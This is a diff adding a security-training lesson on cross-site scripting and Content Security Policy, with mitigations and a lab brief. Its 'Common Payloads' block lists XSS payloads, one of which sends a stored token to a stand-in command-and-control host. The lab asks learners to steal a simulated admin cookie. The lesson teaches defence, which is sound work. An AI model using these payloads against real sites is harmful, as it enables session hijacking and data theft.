@@ -1,0 +1,105 @@
+---
+id: core-r2-xss-01
+title: "Cross-Site Scripting (XSS) & Content Security Policy"
+track: core
+rank: 2
+module: web-security
+order: 25
+estimated_minutes: 35
+objectives_covered: ["secplus:2.2", "secplus:2.5"]
+mitre: ["T1189"]
+xp: 100
+status: draft
+last_reviewed: null
+lab: core-r2-xss-lab-01
+---
+
+## Briefing
+
+### 1. What it is
+
+**Cross-Site Scripting (XSS)** occurs when a web application takes untrusted user input and renders it directly into an HTML webpage without proper validation, escaping, or context-aware encoding.
+
+When this happens, the victim's web browser cannot distinguish between legitimate application scripts authored by the developer and hostile script tags injected by an adversary. The browser executes the injected JavaScript with full authority in the victim's authenticated session context.
+
+Think of XSS like slipping a hypnotic command into an official transcript:
+- The speaker reads the text aloud to the audience word-for-word.
+- Because the audience trusts the speaker's voice, they obey whatever instructions are contained in the speech.
+- In web browsing, the trusted speaker is the website domain, and the audience is the victim's browser.
+
+### 2. Why it matters
+
+Because client-side JavaScript has full access to the Document Object Model (DOM), an attacker who achieves script execution can:
+1. **Hijack Sessions:** Steal authentication cookies (unless protected by `HttpOnly`) or local storage tokens.
+2. **Exfiltrate Data:** Read confidential records, emails, or financial balances displayed on the page.
+3. **Phish In-Context:** Inject realistic login prompts directly onto legitimate banking or corporate pages.
+4. **Perform Unauthorized Actions:** Forcibly initiate money transfers, change email addresses, or add administrative accounts.
+
+### 3. How it works
+
+#### The Three Variations of XSS
+1. **Stored XSS (Persistent):** The payload is saved permanently in the application's backend database (e.g. comments, bios, support tickets). Whenever any user views that page, the script executes automatically.
+2. **Reflected XSS (Non-Persistent):** The payload is delivered via an immediate request parameter (such as a search query string) and reflected back into the response HTML without being stored in a database.
+3. **DOM-based XSS:** The vulnerability exists entirely on the client side when untrusted input flows into a dangerous execution sink (such as `element.innerHTML` or `eval()`).
+
+#### Common Payloads
+```html
+<script>alert(document.domain)</script>
+<img src="invalid.png" onerror="alert(document.cookie)" />
+<svg onload="fetch('https://c2.lab/log?k='+localStorage.getItem('token'))" />
+```
+
+### 4. Real incident
+
+In 2018, British Airways suffered a high-profile "Magecart" digital skimming attack. Attackers injected 22 lines of malicious JavaScript into the payment processing script on the airline's official booking site. Whenever customers submitted flight payments, the injected script silently copied customer names, credit card numbers, CVVs, and billing addresses and exfiltrated them to an attacker-controlled server (`baways.com`), compromising over 380,000 transactions.
+
+### 5. How to defend / mitigate
+
+- **Context-Aware Output Encoding:** Convert reserved characters into their safe HTML entity representations before rendering (`<` to `&lt;`, `>` to `&gt;`).
+- **Use Modern Frameworks:** Modern frameworks (React, Angular, Svelte) automatically escape variables rendered in templates.
+- **HTML Sanitization:** When rich-text formatting is required, use robust sanitization libraries like **DOMPurify** to strip executable tags and attributes.
+- **Content Security Policy (CSP):** Deploy a strict CSP header disabling inline scripts and restricting script sources to trusted, nonced origins.
+- **HttpOnly Cookies:** Ensure sensitive session cookies cannot be accessed via `document.cookie`.
+
+### 6. Commands & syntax
+
+Sanitize rich HTML on the client side using DOMPurify:
+```javascript
+import DOMPurify from 'dompurify';
+const cleanHtml = DOMPurify.sanitize(userUntrustedInput);
+```
+
+### 7. Common mistakes
+
+- **Relying on blacklist string replacement:** Trying to strip out `<script>` tags, which attackers bypass using mixed case (`<sCrIpt>`) or event handlers (`<img onerror=...>`).
+- **Encoding in the wrong context:** Applying HTML entity encoding to data rendered inside a `<script>` tag or attribute context where JavaScript decoding still executes the payload.
+- **Neglecting CSP nonces:** Using `unsafe-inline` in Content Security Policies, completely defeating CSP script protection.
+
+### Remember it like this
+
+> **XSS tricks the browser into executing attacker scripts in your domain's context. Always encode output for the proper context, use HttpOnly on cookies, and enforce a strict CSP.**
+
+### Interview answer
+
+> "Cross-Site Scripting (XSS) occurs when unvalidated user input is rendered into a webpage, allowing attacker-supplied JavaScript to execute in the victim's browser context. The primary mitigations are context-aware output encoding (converting special characters like < and > to safe HTML entities) and robust sanitization via libraries like DOMPurify for rich text. Defense-in-depth requires setting the HttpOnly flag on session cookies to prevent token theft and enforcing a strict Content Security Policy (CSP) with cryptographic nonces to restrict script execution."
+
+## Terminal Check
+
+<TerminalCheck />
+
+## Lab
+
+<LabLink />
+
+In this lab, you will audit the Sentinel operations feed. Inject a stored XSS payload into the comment board, then trigger the simulated Admin Review Crawler to steal the administrator session cookie and capture the flag.
+
+## Debrief
+
+**What a professional does here.** Security engineers audit web codebases to ensure template engines auto-escape output by default, replace unsafe DOM sinks like `innerHTML` with `textContent`, and implement automated end-to-end tests verifying Content Security Policy violations are reported to central security endpoints.
+
+**Key takeaways**
+
+- Stored XSS resides in the database; Reflected XSS requires a crafted link; DOM XSS executes purely on the client.
+- Output encoding neutralizes HTML markup by converting characters into safe entities.
+- HttpOnly cookies prevent XSS payloads from stealing session identifiers.
+- A strict Content Security Policy restricts where scripts can load and execute.
